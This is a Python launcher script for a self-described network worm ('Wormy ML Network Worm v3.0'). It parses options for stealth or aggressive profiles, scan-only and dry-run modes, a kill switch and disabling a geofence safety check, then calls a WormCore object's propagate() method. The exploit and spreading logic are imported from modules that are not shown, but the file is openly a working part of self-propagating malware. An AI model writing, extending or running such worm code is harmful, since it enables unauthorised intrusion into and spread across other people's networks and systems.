import os
import sys


def get_local_ip():
    import socket

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def main():
    import argparse

    parser = argparse.ArgumentParser(description="Wormy ML Network Worm v3.0")
    parser.add_argument("--config", type=str, help="Configuration file")
    parser.add_argument("--scan-only", action="store_true", help="Scan only")
    parser.add_argument("--kill-switch", type=str, help="Kill switch code")
    parser.add_argument(
        "--profile",
        type=str,
        choices=["stealth", "aggressive", "audit"],
        help="Configuration profile",
    )
    parser.add_argument("--dry-run", action="store_true", help="Simulate without real exploits")
    parser.add_argument("--no-monitor", action="store_true", help="Disable CLI monitor")
    parser.add_argument("--interactive", "-i", action="store_true", help="Interactive CLI mode")
    parser.add_argument("--no-geofence", action="store_true", help="Disable geofence check")

    args = parser.parse_args()

    from . import WormCore

    worm = WormCore(
        config_file=args.config,
        use_cli_monitor=not args.no_monitor and not args.interactive,
        profile=args.profile,
        dry_run=args.dry_run,
        interactive=args.interactive,
    )

    if args.no_geofence:
        worm.config.safety.geofence_enabled = False
        from .module_imports import logger

        logger.info("Geofence disabled via --no-geofence flag")

    if args.kill_switch:
        worm.activate_kill_switch(args.kill_switch)
        return

    if args.scan_only:
        from .module_imports import logger

        logger.info("SCAN-ONLY MODE")
        results = worm.scan_network()
        worm.scanner.print_summary()
        return

    if args.interactive:
        from cli import InteractiveCLI

        cli = InteractiveCLI(worm)
        try:
            cli.cmdloop()
        except KeyboardInterrupt:
            worm.shutdown()
        return

    try:
        worm.propagate()
    except KeyboardInterrupt:
        from .module_imports import logger

        logger.warning("\nInterrupted by user")
        worm.shutdown()
    except Exception as e:
        from .module_imports import logger

        logger.error(f"Fatal error: {e}")
        worm.shutdown()
